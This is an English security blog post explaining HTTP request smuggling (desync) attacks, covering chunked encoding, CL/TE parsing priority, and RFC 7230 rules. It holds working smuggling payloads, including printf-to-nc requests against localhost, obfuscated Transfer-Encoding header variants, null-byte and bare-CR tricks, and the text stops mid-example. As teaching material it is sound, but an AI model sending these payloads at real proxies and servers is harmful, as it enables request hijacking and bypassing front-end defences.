<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="This year&amp;rsquo;s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven&amp;rsquo;t had much time. I recently took a look at it.
Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here 一篇文章带你读懂 HTTP Smuggling 攻击.
"><title>Help you understand HTTP Smuggling in one article</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Help you understand HTTP Smuggling in one article">
<meta property="og:description" content="This year&amp;rsquo;s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven&amp;rsquo;t had much time. I recently took a look at it.
Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here 一篇文章带你读懂 HTTP Smuggling 攻击.
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="Sec"><meta property="article:published_time" content="2019-12-08T17:09:00+00:00"><meta property="article:modified_time" content="2019-12-08T17:09:00+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Help you understand HTTP Smuggling in one article">
<meta name=twitter:description content="This year&amp;rsquo;s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven&amp;rsquo;t had much time. I recently took a look at it.
Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here 一篇文章带你读懂 HTTP Smuggling 攻击.
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/Sec/ style=background-color:#0b0;color:#fff>
Sec
</a>
</header>
<h2 class=article-title>
<a href=/2019/12/08/HTTP-Smuggling-en/>Help you understand HTTP Smuggling in one article</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Dec 08, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
20 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>This year&rsquo;s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven&rsquo;t had much time. I recently took a look at it.</p>
<p>Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here <a class=link href=https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/ target=_blank rel=noopener>一篇文章带你读懂 HTTP Smuggling 攻击</a>.</p>
<p>When I researched the other day, it happened that <strong>mengchen@Knownsec 404 Team</strong> also published an <a class=link href=https://paper.seebug.org/1049/ target=_blank rel=noopener>article</a>, which also brought me more inspiration. The author&rsquo;s article is very good. I strongly recommend reading it. Here I combine the author&rsquo;s article with some of my own understanding. This article can also be understood as a supplement and a more detailed description of that article.</p>
<p>The entire article was delayed for about two months because of my time. The middle time interval may be longer, so the article will have more omissions, please forgive me. It is not easy to write. Recently, I have been paying attention to this aspect of security issues. Welcome to study and discuss together: ) Contact: emVkZHl1Lmx1QGdtYWlsLmNvbQ==</p>
<p>In the future, if there is a new summary, I will also send my <a class=link href=https://blog.zeddyu.info target=_blank rel=noopener>blog</a>.</p>
<h2 id=tlnr>TL;NR</h2>
<p><figure class=gallery-image style=flex-grow:177;flex-basis:426px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520131941.jpg data-size=1931x1086><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520131941.jpg width=1931 height=1086 srcset="/2019/12/08/HTTP-Smuggling-en/20200520131941_hu60d960ed495a2b585e6ac44f86f4cb6d_142835_480x0_resize_q75_box.jpg 480w, /2019/12/08/HTTP-Smuggling-en/20200520131941_hu60d960ed495a2b585e6ac44f86f4cb6d_142835_1024x0_resize_q75_box.jpg 1024w" loading=lazy>
</a>
</figure></p>
<p>Pic from <a class=link href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target=_blank rel=noopener>https://twitter.com/SpiderSec/status/1200413390339887104?s=19</a></p>
<h2 id=timeline>TimeLine</h2>
<p>Before we mention HTTP Smuggling, let&rsquo;s take a look at the evolution process:</p>
<p>@Amit Klein proposed the <a class=link href=https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf target=_blank rel=noopener>HTTP Response Splitting</a> technology in 2004, which is the prototype of the HTTP Smuggling attack.</p>
<p>About HTTP Smuggling This attack method was first proposed by @Watchfire in 2005 <a class=link href=https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf target=_blank rel=noopener>HTTP Request Smuggling</a>.</p>
<p>HTTP Parameter Pollution (HPP), also known as HTTP parameter pollution, is actually a special HTTP Smuggling attack. It was first proposed by @Stefano di Paola & @Luca Carettoni at the OWASP Poland conference in 2009. It caused a big sensation and was widely used in bypassing WAF.</p>
<p>Defcon 24 in 2016, @regilero proposed <a class=link href=https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf target=_blank rel=noopener>Hiding Wookiees In Http</a>, Further reveals the HTTP Smuggling attack.</p>
<p>Defcon 27 in 2019, @James Kettle proposed [HTTP Desync Attacks: Smashing into the Cell Next Door](<a class=link href=https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON- target=_blank rel=noopener>https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-</a> 27-albinowax-HTTP-Desync-Attacks.pdf), explained How to use PayPal vulnerability with HTTP Smuggling technology.</p>
<h2 id=causes>Causes</h2>
<p>However, @James Kettle&rsquo;s PPT did not describe in detail what the attack was and how it was formed. At first, I still had very big doubts after reading it. Then I learned about the <a class=link href=https://regilero.github.io/tag/Smuggling/ target=_blank rel=noopener>HTTP Smuggling&rsquo;s in the @regilero blog. Article</a>, I have a clear understanding.</p>
<h3 id=http-connection-mod>HTTP Connection Mod</h3>
<p>In the protocol design before <code>HTTP1.0</code>, every time a client makes an HTTP request, it needs to establish a TCP connection with the server. Modern web site pages are composed of multiple resources. We need to obtain the content of a web page, not only request HTML documents, but also various resources such as JS, CSS, and images. , It will cause the load overhead of the HTTP server to increase. So in <code>HTTP1.1</code>,<code> Keep-Alive</code> and <code>Pipeline</code> were added.</p>
<h4 id=keep-alive>Keep-Alive</h4>
<p>According to <a class=link href=https://tools.ietf.org/html/rfc7230##section-6 target=_blank rel=noopener>RFC7230</a>:</p>
<blockquote>
<p>​ HTTP/1.1 defaults to the use of &ldquo;persistent connections&rdquo;, allowing multiple requests and responses to be carried over a single connection. The &ldquo;close&rdquo; connection option is used to signal that a connection will not persist after the current request/response. HTTP implementations SHOULD support persistent connections.</p>
</blockquote>
<p>Keep-Alive is used by default in HTTP/1.1, allowing multiple requests and responses to be hosted on a single connection.</p>
<blockquote>
<p>​ The so-called <code>Keep-Alive</code>, is to add a special request header <code>Connection: Keep-Alive</code> in the HTTP request, tell the server, after receiving this HTTP request, do not close the TCP link, followed by the same target server HTTP Request, reuse this TCP link, so only need to perform a TCP handshake process, which can reduce server overhead, save resources, and speed up access. Of course, this feature is enabled by default in <code>HTTP1.1</code>.</p>
</blockquote>
<p>Of course, some requests carry <code>Connection: close</code>, after the communication is completed, the server will interrupt the TCP connection.</p>
<h4 id=pipline>Pipline</h4>
<blockquote>
<p>With <code>Keep-Alive</code>, there will be a <code>Pipeline</code>, and the client can send its own HTTP request like a pipeline without waiting for the response from the server. After receiving the request, the server needs to follow the first-in first-out mechanism, strictly correlate the request and response, and then send the response to the client.</p>
<p>Nowadays, the browser does not enable <code>Pipeline</code> by default, but the general server provides support for <code>Pipleline</code>.</p>
</blockquote>
<p>The more important introduction in HTTP / 1.1 is the pipeline technology. The following is a comparison chart with and without piepeline technology:</p>
<p><figure class=gallery-image style=flex-grow:143;flex-basis:345px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520134869.png data-size=2560x1780><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520134869.png width=2560 height=1780 srcset="/2019/12/08/HTTP-Smuggling-en/20200520134869_hu705e3a4eab06dc8a2b4bfbfa9dc6ca0d_101432_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520134869_hu705e3a4eab06dc8a2b4bfbfa9dc6ca0d_101432_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>We can clearly see that after using the pipeline, there is no need to wait for the previous request to complete its response before processing the second request. This is like asynchronous processing.</p>
<h3 id=message-body>Message Body</h3>
<p><a class=link href=https://tools.ietf.org/html/rfc7230##section-3.3 target=_blank rel=noopener>https://tools.ietf.org/html/rfc7230##section-3.3</a></p>
<h4 id=transfer-encoding>Transfer-Encoding</h4>
<blockquote>
<p>Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP&rsquo;s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</p>
</blockquote>
<p>Transfer-Encoding is a field designed to support the secure transmission of binary data by 7-bit transfer services. It is somewhat similar to Content-Transfer-Encoding in the MIME (Multipurpose Internet Mail Extensions) header. In the case of HTTP, Transfer-Encoding is mainly used to encode the payload body in a specified encoding form for secure transmission to the user. Introduced in HTTP/1.1 and deprecated in HTTP/2.</p>
<p><a class=link href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding target=_blank rel=noopener>MDN</a> lists several attributes:</p>
<pre tabindex=0><code>chunked | compress | deflate | gzip | identity
</code></pre><p>Here we mainly focus on chunked, a transmission encoding method, which is not mentioned for the first time in a network attack. It also used in bypassing WAF frequently.</p>
<p>We can see the definition specification of chunk transmission in <a class=link href=https://tools.ietf.org/html/rfc7230##section-4.1 target=_blank rel=noopener>RFC7230</a>.</p>
<blockquote>
<p>4.1. Chunked Transfer Coding</p>
<p>The chunked transfer coding wraps the payload body in order to
transfer it as a series of chunks, each with its own size indicator,
followed by an OPTIONAL trailer containing header fields. Chunked
enables content streams of unknown size to be transferred as a
sequence of length-delimited buffers, which enables the sender to
retain connection persistence and the recipient to know when it has
received the entire message.</p>
<pre><code> chunked-body   = *chunk
                  last-chunk
                  trailer-part
                  CRLF

 chunk          = chunk-size [ chunk-ext ] CRLF
                  chunk-data CRLF
 chunk-size     = 1*HEXDIG
 last-chunk     = 1*(&quot;0&quot;) [ chunk-ext ] CRLF

 chunk-data     = 1*OCTET ; a sequence of chunk-size octets
</code></pre>
<p>The chunk-size field is a string of hex digits indicating the size of
the chunk-data in octets. The chunked transfer coding is complete
when a chunk with a chunk-size of zero is received, possibly followed
by a trailer, and finally terminated by an empty line.</p>
<p>A recipient MUST be able to parse and decode the chunked transfer
coding.</p>
<p>4.1.1. Chunk Extensions</p>
<p>The chunked encoding allows each chunk to include zero or more chunk
extensions, immediately following the chunk-size, for the sake of
supplying per-chunk metadata (such as a signature or hash),
mid-message control information, or randomization of message body
size.</p>
<pre><code> chunk-ext      = *( &quot;;&quot; chunk-ext-name [ &quot;=&quot; chunk-ext-val ] )

 chunk-ext-name = token
 chunk-ext-val  = token / quoted-string
</code></pre>
<p>The chunked encoding is specific to each connection and is likely to
be removed or recoded by each recipient (including intermediaries)
before any higher-level application would have a chance to inspect
the extensions. Hence, use of chunk extensions is generally limited</p>
<p>to specialized HTTP services such as &ldquo;long polling&rdquo; (where client and
server can have shared expectations regarding the use of chunk
extensions) or for padding within an end-to-end secured connection.</p>
<p>A recipient MUST ignore unrecognized chunk extensions. A server
ought to limit the total length of chunk extensions received in a
request to an amount reasonable for the services provided, in the
same way that it applies length limitations and timeouts for other
parts of a message, and generate an appropriate 4xx (Client Error)
response if that amount is exceeded.</p>
</blockquote>
<p>If you don&rsquo;t want to look too carefully here, we just need to understand what kind of structure it is. You can also refer to <a class=link href=https://en.wikipedia.org/wiki/Chunked_transfer_encoding target=_blank rel=noopener>Wiki: Chunked transfer encoding</a>, for example if we want to send the following message using chunked.</p>
<pre tabindex=0><code>Wikipedia in\r\n\r\nchunks.
</code></pre><p>We can send it like this:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>POSTT /xxx HTTP/1.1
</span><span class=err>Host: xxx
</span><span class=err>Content-Type: text/plain 
</span><span class=err>Transfer-Encoding: chunked
</span><span class=err>
</span><span class=err>4\r\n
</span><span class=err>Wiki\r\n
</span><span class=err>5\r\n
</span><span class=err>pedia\r\n
</span><span class=err>e\r\n
</span><span class=err> in\r\n\r\nchunks.\r\n
</span><span class=err>0\r\n
</span><span class=err>\r\n
</span></code></pre></div><p>Here is a brief explanation. **We use <code>\r\n</code> for CRLF, so<code>\r\n</code> is two bytes **; the first number 4 indicates that there will be 4 bytes data next, which is the 4 letters of Wiki, and according to the RFC document standard, the letter Wiki part needs to be followed by <code>\r\n</code> to indicate the chunk-data part, and the number 4 needs to be followed by<code> \r\n</code> to indicate the chunk -size part, and the number is a hexadecimal number, such as the third data.</p>
<pre tabindex=0><code>e\r\n
in\r\n\r\nchunks.\r\n
</code></pre><p>Here the first space exists, the <code>\r\n</code> in the data counts two characters, and the last<code> \r\n</code> indicates the end of the data. In this case, the first space is 1 byte + in 2 bytes letter + 2 <code>\r\n</code> counts 4 bytes + &lsquo;chunks.&rsquo; 7 bytes letter = 14 bytes, 14 is &lsquo;e&rsquo; in hexadecimal.</p>
<p>The last <code>0\r\n\r\n</code> indicates the end of the chunk section.</p>
<h2 id=background>Background</h2>
<p>In itself, these things are not harmful, they are used to increase the network transmission rate in various ways, but in some special cases, some corresponding security problems will occur.</p>
<blockquote>
<p>​ In order to improve the user&rsquo;s browsing speed, improve the user experience, and reduce the burden on the server, many websites use the CDN acceleration service. The simplest acceleration service is to add a reverse proxy server with caching function in front of the source station. When the user requests some static resources, it can be obtained directly from the proxy server without having to obtain it from the source server. This has a very typical topology.</p>
</blockquote>
<p>Here is a picture from @mengchen :</p>
<p><figure class=gallery-image style=flex-grow:132;flex-basis:318px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520133872.png data-size=532x401><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520133872.png width=532 height=401 srcset="/2019/12/08/HTTP-Smuggling-en/20200520133872_hu6951c364d3c4f44760904149a67b0bef_13305_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520133872_hu6951c364d3c4f44760904149a67b0bef_13305_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>Generally speaking, the reverse proxy and back-end server will not use pipeline technology, or even keep-alive. The measures taken by the reverse proxy is to reuse the TCP connection, because compare with the reverse proxy and back-end server, the reverse proxy server and the back-end server IP are relatively fixed, and requests from different users establish a link with the back-end server through the proxy server, and the TCP link between the two is reused.</p>
<p><figure class=gallery-image style=flex-grow:136;flex-basis:326px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520139456.png data-size=1836x1350><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520139456.png width=1836 height=1350 srcset="/2019/12/08/HTTP-Smuggling-en/20200520139456_hu5e3b7b73fc89eaa2bc08dfabf445d6a5_290162_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520139456_hu5e3b7b73fc89eaa2bc08dfabf445d6a5_290162_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p><figure class=gallery-image style=flex-grow:133;flex-basis:320px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520130675.png data-size=1770x1325><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520130675.png width=1770 height=1325 srcset="/2019/12/08/HTTP-Smuggling-en/20200520130675_hu79f605ea54634d6194051308bbfa9f2f_230289_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520130675_hu79f605ea54634d6194051308bbfa9f2f_230289_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p><figure class=gallery-image style=flex-grow:135;flex-basis:324px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520134020.png data-size=1830x1354><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520134020.png width=1830 height=1354 srcset="/2019/12/08/HTTP-Smuggling-en/20200520134020_hue4a8c6ca94078ac11f24cc468ac24f79_240215_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520134020_hue4a8c6ca94078ac11f24cc468ac24f79_240215_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<blockquote>
<p>​ When we send a fuzzy HTTP request to the proxy server, because the implementation of the two servers is different, the proxy server may consider this to be a HTTP request and then forward it to the source server of the back-end. However, after the source server is parsed, only part of it is a normal request, and the remaining part is a smuggling request. When the part affects the normal user&rsquo;s request, the HTTP smuggling attack is implemented.</p>
</blockquote>
<p>The HTTP Smuggling attack is based on the inconsistency between the reverse proxy and the backend server in parsing and processing HTTP requests. Using this difference, we can embed another HTTP request in order to achieve our purpose of “smuggling” the request. It directly shows that we can access intranet services or cause some other attacks.</p>
<h2 id=attack-method>Attack Method</h2>
<p>Since it is based on analytical differences, what analytical differences will we have? The scenario is the scenario above, but we simplify it and fix the back-end server to one, there is no certain probability. In other words, the architecture is similar to the following diagram:</p>
<pre tabindex=0><code>                      User            Front           Backend
                      |               |               |
                      |------A-------&gt;|               | 
                      |               |-------A------&gt;| 
                      |               |&lt;-A(200)-------|
                      |&lt;-A(200)-------|               |
</code></pre><p>We know that both Content-Length and Transfer-Encoding can be used as a way to process the body during POST data transmission. In order to facilitate reading and writing, we have the following shorthand rules for field processing priority rules:</p>
<ul>
<li>CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.</li>
<li>TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.</li>
</ul>
<p>And Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following, <code>\r\n</code> is used instead of CRLF, and the length is two bytes.</p>
<h3 id=chunks-priority-on-content-length>Chunks Priority On Content-Length</h3>
<p>Some may see that this will have the same confusion as me. Is the RFC document not standardized for CL & TE parsing priorities? Yes, we can read <a class=link href=https://tools.ietf.org/html/rfc7230##section-3.3.3 target=_blank rel=noopener>RFC 7230 Message Body Length</a>:</p>
<blockquote>
<p>​ If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p>
</blockquote>
<p>Although it is pointed out that TL takes precedence over CL, we can still bypass it in some ways, or that the middleware is not implemented in accordance with this RFC standard specification, which leads to differences.</p>
<p>For example, we use the following code to send an HTTP request:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>printf</span> <span class=s1>&#39;GET / HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Content-length:56\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Dummy:Header\r\n\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;GET /tmp HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=p>|</span> nc -q3 127.0.0.1 <span class=m>8080</span>
</code></pre></div><p>The above correct resolution should be resolved into three requests:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
<span class=n>Content-length</span><span class=o>:</span><span class=l>56</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
<span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>

<span class=g>0
</span><span class=g>
</span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/tmp</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
<span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>

</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/tests</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
<span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>

</code></pre></div><p>If there is a TE & CL priority problem, it will be parsed into two requests:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET / HTTP/1.1[CRLF]
</span><span class=err>Host:localhost[CRLF]
</span><span class=err>Content-length:56[CRLF]
</span><span class=err>Transfer-Encoding: chunked[CRLF] (ignored and removed, hopefully)
</span><span class=err>Dummy:Header[CRLF]
</span><span class=err>[CRLF]
</span><span class=err>0[CRLF]  (start of 56 bytes of body)
</span><span class=err>[CRLF]
</span><span class=err>GET /tmp HTTP/1.1[CRLF]
</span><span class=err>Host:localhost[CRLF]
</span><span class=err>Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)
</span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/tests</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
<span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>

</code></pre></div><h3 id=bad-chunked-transmission>Bad Chunked Transmission</h3>
<p>According to <a class=link href=https://tools.ietf.org/html/rfc7230##section-3.3.3 target=_blank rel=noopener>RFC7230 section 3.3.3</a> ：</p>
<blockquote>
<p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p>
</blockquote>
<p>When receiving <code>Transfer-Encoding: chunked, zorg</code>, it should return a 400 error.</p>
<p>We have a lot payloads to bypass it. Such as:</p>
<pre tabindex=0><code>Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked

Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

GET / HTTP/1.1
 Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
 : chunked
</code></pre><h3 id=null-in-headers>Null In Headers</h3>
<p>This problem is more likely to occur in some middleware servers written in C language, because <code>\0</code> stands for the end of string character in C language. When used in the header, if we use<code> \0</code>, some middleware may appear abnormal Parsing.</p>
<p>Such as:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1>## 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
<span class=nb>printf</span> <span class=s1>&#39;GET / HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Content-\0dummy: foo\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;length: 56\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;GET /tmp HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=p>|</span> nc -q3 127.0.0.1 <span class=m>8080</span>
</code></pre></div><p>When some middleware processes the above request, when it encounters <code>\0</code>, it will continue to read lines, which will also cause parsing differences.</p>
<h3 id=crlf>CRLF</h3>
<p>According to <a class=link href=https://tools.ietf.org/html/rfc7230##section-3.5 target=_blank rel=noopener>RFC7320 section-3.5</a>:</p>
<blockquote>
<p>Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.</p>
</blockquote>
<p>In other words, in addition to CRLF, we can also use LF as EOL, but in the version of Node.js &lt;5.6.0, the handling of CRLF is also more interesting:</p>
<pre tabindex=0><code>[CR] + ? == [CR][LF]		//true
</code></pre><p>Suppose we have a Front server that parses CRLF normally, and the backend is a Node.js service with this vulnerability. We can send the following request:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET / HTTP/1.1\r\n
</span><span class=err>Host:localhost\r\n
</span><span class=err>Dummy: Header\rZTransfer-Encoding: chunked\r\n
</span><span class=err>Content-length: 52\r\n
</span><span class=err>\r\n
</span><span class=err>0\r\n
</span><span class=err>\r\n
</span><span class=err>GET /tmp HTTP/1.1\r\n
</span><span class=err>Host:localhost\r\n
</span><span class=err>Dummy:Header\r\n
